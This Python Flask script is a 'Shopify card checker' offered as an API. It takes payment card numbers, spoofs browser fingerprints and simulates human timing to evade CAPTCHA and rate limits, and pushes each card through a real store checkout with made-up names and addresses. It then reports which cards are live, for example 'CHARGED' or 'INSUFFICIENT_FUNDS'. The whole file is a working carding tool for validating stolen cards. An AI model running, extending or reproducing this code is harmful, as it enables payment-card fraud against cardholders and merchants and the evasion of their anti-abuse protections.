#!/usr/bin/env python3
"""
SHOPIFY CARD CHECKER - CAPTCHA BYPASS VERSION
Full browser fingerprint + human simulation
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
import httpx
import random
import re
import json
import os
import time
from urllib.parse import urlparse
from datetime import datetime

app = Flask(__name__)
CORS(app)

# ============================================================
# BROWSER FINGERPRINT POOL
# ============================================================

BROWSER_FINGERPRINTS = [
    {
        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec_ch_ua_platform': '"Windows"',
        'accept_language': 'en-US,en;q=0.9',
        'platform': 'Windows'
    },
    {
        'user_agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec_ch_ua_platform': '"macOS"',
        'accept_language': 'en-US,en;q=0.9',
        'platform': 'macOS'
    },
    {
        'user_agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="119", "Google Chrome";v="119"',
        'sec_ch_ua_platform': '"Linux"',
        'accept_language': 'en-US,en;q=0.9',
        'platform': 'Linux'
    }
]

# ============================================================
# SHOPIFY CHECKER WITH CAPTCHA BYPASS
# ============================================================

class ShopifyChecker:
    def __init__(self):
        self.fingerprint = random.choice(BROWSER_FINGERPRINTS)
        self.user_agent = self.fingerprint['user_agent']
        self.session_cookies = {}
    
    def get_browser_headers(self, extra=None):
        """Generate complete browser headers with fingerprint"""
        headers = {
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': self.fingerprint['accept_language'],
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
            'sec-ch-ua': self.fingerprint['sec_ch_ua'],
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': self.fingerprint['sec_ch_ua_platform'],
            'DNT': '1',
            'Pragma': 'no-cache'
        }
        if extra:
            headers.update(extra)
        return headers
    
    async def random_delay(self, min_sec=0.3, max_sec=1.5):
        """Human-like random delay"""
        await asyncio.sleep(random.uniform(min_sec, max_sec))
    
    async def simulate_human_behavior(self):
        """Simulate human-like pauses and interactions"""
        # Random "thinking" pauses
        pauses = [0.1, 0.2, 0.3, 0.5, 0.7, 1.0]
        await asyncio.sleep(random.choice(pauses))
        # Random "typing" speed simulation
        if random.random() > 0.7:
            await asyncio.sleep(random.uniform(0.1, 0.4))
    
    def find_between(self, s, start, end):
        try:
            if start in s and end in s:
                return (s.split(start))[1].split(end)[0]
            return ""
        except:
            return ""
    
    async def get_random_info(self):
        """Generate realistic US address with BIN-based matching"""
        addresses = [
            {"add1": "123 Main St", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04101"},
            {"add1": "456 Oak Ave", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04102"},
            {"add1": "789 Pine Rd", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04103"},
            {"add1": "321 Elm St", "city": "Bangor", "state": "Maine", "state_short": "ME", "zip": "04401"},
            {"add1": "654 Maple Dr", "city": "Lewiston", "state": "Maine", "state_short": "ME", "zip": "04240"},
            {"add1": "777 Broadway", "city": "New York", "state": "New York", "state_short": "NY", "zip": "10001"},
            {"add1": "888 Sunset Blvd", "city": "Los Angeles", "state": "California", "state_short": "CA", "zip": "90028"}
        ]
        
        address = random.choice(addresses)
        first_names = ["John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa", "James", "Emma"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis", "Rodriguez"]
        
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1,999)}@gmail.com"
        phone = random.choice(["2025550199", "3105551234", "4155559876", "6175550123", "9718081573"])
        
        return {
            "fname": first_name,
            "lname": last_name,
            "email": email,
            "phone": phone,
            "add1": address["add1"],
            "city": address["city"],
            "state": address["state"],
            "state_short": address["state_short"],
            "zip": address["zip"]
        }

    async def check_card(self, site_url, card):
        """Main card checking with CAPTCHA bypass"""
        start_time = time.time()
        
        async with httpx.AsyncClient(follow_redirects=True, timeout=60.0) as session:
            try:
                parts = card.split('|')
                if len(parts) != 4:
                    return {"status": "ERROR", "message": "Invalid format", "time": f"{time.time() - start_time:.1f}s"}
                
                cc, mon, year, cvv = parts
                
                # ============================================
                # PHASE 1: Browser Warm-up (Critical for CAPTCHA bypass)
                # ============================================
                print("🔄 Warming up browser session...")
                
                # Visit homepage with full browser headers
                headers = self.get_browser_headers()
                resp = await session.get(site_url, headers=headers)
                await self.random_delay(1.0, 2.0)
                
                # Visit a random page to build session
                await session.get(f"{site_url}/collections/all", headers=headers)
                await self.random_delay(0.5, 1.0)
                
                # ============================================
                # PHASE 2: Get Product with retry on 429
                # ============================================
                print("📦 Fetching product...")
                json_headers = self.get_browser_headers({'Accept': 'application/json'})
                
                max_retries = 3
                resp = None
                for attempt in range(max_retries):
                    resp = await session.get(site_url + '/products.json', headers=json_headers)
                    if resp.status_code == 200:
                        break
                    elif resp.status_code == 429:
                        wait = random.uniform(5.0, 10.0)
                        print(f"⏳ Rate limited. Waiting {wait:.1f}s...")
                        await asyncio.sleep(wait)
                        # Rotate fingerprint
                        self.fingerprint = random.choice(BROWSER_FINGERPRINTS)
                        json_headers['User-Agent'] = self.fingerprint['user_agent']
                        continue
                    else:
                        return {"status": "ERROR", "message": f"Product fetch failed: {resp.status_code}", "time": f"{time.time() - start_time:.1f}s"}
                
                if resp is None or resp.status_code != 200:
                    return {"status": "ERROR", "message": "Product fetch failed after retries", "time": f"{time.time() - start_time:.1f}s"}
                
                products = resp.json().get('products', [])
                if not products:
                    return {"status": "ERROR", "message": "No products found", "time": f"{time.time() - start_time:.1f}s"}
                
                product = products[0]
                variant_id = product['variants'][0]['id']
                product_handle = product['handle']
                price = product['variants'][0]['price']
                
                print(f"✅ Product: {product['title']} - ${price}")
                
                # ============================================
                # PHASE 3: Product Page Visit (Human-like)
                # ============================================
                await self.random_delay(0.5, 1.0)
                await session.get(f"{site_url}/products/{product_handle}", headers=headers)
                await self.simulate_human_behavior()
                await self.random_delay(0.3, 0.8)
                
                # ============================================
                # PHASE 4: Add to Cart
                # ============================================
                print("🛒 Adding to cart...")
                cart_headers = self.get_browser_headers({
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': site_url,
                    'Referer': f"{site_url}/products/{product_handle}"
                })
                
                add_data = {
                    'id': str(variant_id),
                    'quantity': '1',
                    'form_type': 'product'
                }
                
                resp = await session.post(site_url + '/cart/add.js', headers=cart_headers, data=add_data)
                if resp.status_code != 200:
                    return {"status": "ERROR", "message": f"Cart add failed: {resp.status_code}", "time": f"{time.time() - start_time:.1f}s"}
                
                await self.random_delay(0.5, 1.0)
                
                # ============================================
                # PHASE 5: View Cart
                # ============================================
                await session.get(site_url + '/cart', headers=headers)
                await self.random_delay(0.5, 1.0)
                
                # ============================================
                # PHASE 6: Get Cart Token
                # ============================================
                resp = await session.get(f"{site_url}/cart.js", headers=headers)
                cart_data = resp.json()
                token = cart_data.get('token')
                if not token:
                    return {"status": "ERROR", "message": "No cart token", "time": f"{time.time() - start_time:.1f}s"}
                
                # ============================================
                # PHASE 7: Initiate Checkout
                # ============================================
                print("💳 Initiating checkout...")
                checkout_headers = self.get_browser_headers({
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': site_url,
                    'Referer': f"{site_url}/cart"
                })
                
                await session.get(f"{site_url}/checkout", headers=checkout_headers)
                await self.random_delay(0.5, 1.0)
                
                resp = await session.post(
                    f"{site_url}/cart",
                    headers=checkout_headers,
                    data={'checkout': '', 'updates[]': '1'}
                )
                html_content = resp.text
                
                # ============================================
                # PHASE 8: Extract Tokens
                # ============================================
                session_token_match = re.search(
                    r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"',
                    html_content
                )
                if not session_token_match:
                    return {"status": "ERROR", "message": "Token extraction failed", "time": f"{time.time() - start_time:.1f}s"}
                
                session_token = session_token_match.group(1)
                queue_token = self.find_between(html_content, 'queueToken&quot;:&quot;', '&quot;')
                stable_id = self.find_between(html_content, 'stableId&quot;:&quot;', '&quot;')
                payment_id = self.find_between(html_content, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
                
                if not all([session_token, queue_token, stable_id, payment_id]):
                    return {"status": "ERROR", "message": "Token extraction incomplete", "time": f"{time.time() - start_time:.1f}s"}
                
                # ============================================
                # PHASE 9: Get Random Info
                # ============================================
                info = await self.get_random_info()
                fname, lname, email, phone = info["fname"], info["lname"], info["email"], info["phone"]
                add1, city, state_short, zip_code = info["add1"], info["city"], info["state_short"], info["zip"]
                
                # ============================================
                # PHASE 10: Create Payment Session
                # ============================================
                print("🔐 Creating payment session...")
                session_created = False
                session_id = None
                
                endpoints = [
                    "https://deposit.us.shopifycs.com/sessions",
                    "https://checkout.shopifycs.com/sessions"
                ]
                
                for endpoint in endpoints:
                    try:
                        payment_headers = {
                            'Accept': 'application/json',
                            'Content-Type': 'application/json',
                            'Origin': 'https://checkout.shopifycs.com',
                            'User-Agent': self.user_agent,
                        }
                        
                        payment_payload = {
                            'credit_card': {
                                'number': cc,
                                'month': mon,
                                'year': year,
                                'verification_value': cvv,
                                'name': f"{fname} {lname}"
                            },
                            'payment_session_scope': urlparse(site_url).netloc
                        }
                        
                        resp = await session.post(endpoint, headers=payment_headers, json=payment_payload)
                        if resp.status_code == 200:
                            data = resp.json()
                            if 'id' in data:
                                session_id = data['id']
                                session_created = True
                                break
                    except:
                        continue
                
                if not session_created:
                    return {"status": "ERROR", "message": "Payment session failed", "time": f"{time.time() - start_time:.1f}s"}
                
                # ============================================
                # PHASE 11: GraphQL Submission
                # ============================================
                print("📤 Submitting GraphQL...")
                graphql_url = f"{site_url}/checkouts/unstable/graphql"
                graphql_headers = {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'Origin': site_url,
                    'Referer': f"{site_url}/checkout",
                    'User-Agent': self.user_agent,
                    'x-checkout-one-session-token': session_token,
                    'x-checkout-web-source-id': token,
                }
                
                random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"
                
                graphql_payload = {
                    'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on FailedReceipt{id processingError{code __typename}__typename}__typename}',
                    'variables': {
                        'input': {
                            'sessionInput': {'sessionToken': session_token},
                            'queueToken': queue_token,
                            'delivery': {
                                'deliveryLines': [{
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyMatchingConditions': {
                                            'estimatedTimeInTransit': {'any': True},
                                            'shipments': {'any': True}
                                        },
                                        'options': {}
                                    },
                                    'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                                    'destination': {
                                        'streetAddress': {
                                            'address1': add1,
                                            'address2': '',
                                            'city': city,
                                            'countryCode': 'US',
                                            'postalCode': zip_code,
                                            'firstName': fname,
                                            'lastName': lname,
                                            'zoneCode': state_short,
                                            'phone': phone
                                        }
                                    },
                                    'deliveryMethodTypes': ['SHIPPING'],
                                    'expectedTotalPrice': {'any': True}
                                }],
                                'noDeliveryRequired': []
                            },
                            'merchandise': {
                                'merchandiseLines': [{
                                    'stableId': stable_id,
                                    'merchandise': {
                                        'productVariantReference': {
                                            'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                                            'variantId': f'gid://shopify/ProductVariant/{variant_id}'
                                        }
                                    },
                                    'quantity': {'items': {'value': 1}},
                                    'expectedTotalPrice': {'any': True}
                                }]
                            },
                            'payment': {
                                'totalAmount': {'any': True},
                                'paymentLines': [{
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': payment_id,
                                            'sessionId': session_id,
                                            'billingAddress': {
                                                'streetAddress': {
                                                    'address1': add1,
                                                    'city': city,
                                                    'countryCode': 'US',
                                                    'postalCode': zip_code,
                                                    'firstName': fname,
                                                    'lastName': lname,
                                                    'zoneCode': state_short,
                                                    'phone': phone
                                                }
                                            }
                                        }
                                    },
                                    'amount': {'any': True}
                                }],
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': add1,
                                        'city': city,
                                        'countryCode': 'US',
                                        'postalCode': zip_code,
                                        'firstName': fname,
                                        'lastName': lname,
                                        'zoneCode': state_short,
                                        'phone': phone
                                    }
                                }
                            },
                            'buyerIdentity': {
                                'buyerIdentity': {'presentmentCurrency': 'USD', 'countryCode': 'US'},
                                'contactInfoV2': {'emailOrSms': {'value': email}}
                            },
                            'taxes': {
                                'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}}
                            }
                        },
                        'attemptToken': f'{token}-{random.random()}',
                        'analytics': {
                            'requestUrl': f'{site_url}/checkouts/cn/{token}',
                            'pageId': random_page_id
                        }
                    }
                }
                
                resp = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
                elapsed = time.time() - start_time
                
                if resp.status_code != 200:
                    return {"status": "ERROR", "message": f"GraphQL failed: {resp.status_code}", "time": f"{elapsed:.1f}s"}
                
                data = resp.json()
                completion = data.get('data', {}).get('submitForCompletion', {})
                
                # ============================================
                # PHASE 12: Parse Result
                # ============================================
                if completion.get('__typename') == 'SubmitSuccess':
                    receipt = completion.get('receipt', {})
                    if receipt.get('__typename') == 'ProcessedReceipt':
                        return {
                            "status": "CHARGED",
                            "message": "ORDER_PLACED",
                            "order_id": receipt.get('token'),
                            "price": price,
                            "time": f"{elapsed:.1f}s"
                        }
                    elif receipt.get('__typename') == 'ActionRequiredReceipt':
                        return {
                            "status": "APPROVED",
                            "message": "3DS_REQUIRED",
                            "price": price,
                            "time": f"{elapsed:.1f}s"
                        }
                
                elif completion.get('__typename') == 'SubmitRejected':
                    errors = completion.get('errors', [])
                    for error in errors:
                        code = error.get('code', '')
                        if 'INSUFFICIENT_FUNDS' in code:
                            return {"status": "APPROVED", "message": "INSUFFICIENT_FUNDS", "price": price, "time": f"{elapsed:.1f}s"}
                        elif 'CVC' in code or 'CVV' in code:
                            return {"status": "APPROVED", "message": "INCORRECT_CVC", "price": price, "time": f"{elapsed:.1f}s"}
                        elif 'OTP' in code or '3D' in code:
                            return {"status": "APPROVED", "message": "OTP_REQUIRED", "price": price, "time": f"{elapsed:.1f}s"}
                    return {"status": "DECLINED", "message": "CARD_DECLINED", "price": price, "time": f"{elapsed:.1f}s"}
                
                else:
                    return {"status": "DECLINED", "message": "CARD_DECLINED", "price": price, "time": f"{elapsed:.1f}s"}
                
            except Exception as e:
                return {"status": "ERROR", "message": str(e)[:100], "time": f"{time.time() - start_time:.1f}s"}

# ============================================================
# FLASK ROUTES
# ============================================================

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'status': 'online',
        'name': 'Shopify Card Checker - CAPTCHA Bypass',
        'version': '4.0',
        'endpoints': {
            '/check': 'POST - Check card',
            '/shopify': 'GET/POST - Check card (alias)',
            '/health': 'GET - Health check'
        }
    })

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})

@app.route('/check', methods=['POST'])
def check_card():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Missing JSON payload'}), 400
        
        site = data.get('site')
        cc = data.get('cc')
        
        if not site or not cc:
            return jsonify({'error': 'Missing site or cc'}), 400
        
        if not site.startswith('http'):
            site = 'https://' + site
        
        checker = ShopifyChecker()
        result = asyncio.run(checker.check_card(site, cc))
        
        return jsonify({
            'site': site,
            'cc': cc,
            'result': result,
            'timestamp': datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/shopify', methods=['GET', 'POST'])
def shopify_alias():
    if request.method == 'GET':
        site = request.args.get('site')
        cc = request.args.get('cc')
        if site and cc:
            data = {'site': site, 'cc': cc}
            request._cached_json = (data,)
            return check_card()
    return check_card()

# ============================================================
# MAIN
# ============================================================

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    print(f"🔥 Shopify Checker API v4.0 running on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
